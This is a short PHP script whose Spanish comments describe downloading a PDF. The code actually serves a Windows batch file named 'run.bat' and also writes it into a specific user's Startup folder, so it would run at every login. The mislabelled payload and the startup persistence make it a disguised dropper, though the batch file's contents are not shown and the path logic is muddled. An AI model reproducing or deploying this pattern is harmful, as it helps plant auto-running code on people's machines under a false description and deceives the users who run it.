<?php

$file_url = 'run.bat'; // URL del archivo PDF que deseas descargar
$file_name = 'run.bat'; // nombre que le darás al archivo PDF descargado
$file_path = 'C:\Users\adelmo.vargas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\' . $file_name; // ruta donde se guardará el archivo PDF descargado


header('Content-Type: application/octet-stream');
header("Content-Transfer-Encoding: Binary");
header("Content-disposition: attachment; filename=\"" . $file_name . "\"");
readfile($file_url);
file_put_contents($file_path, file_get_contents($file_url));

?>
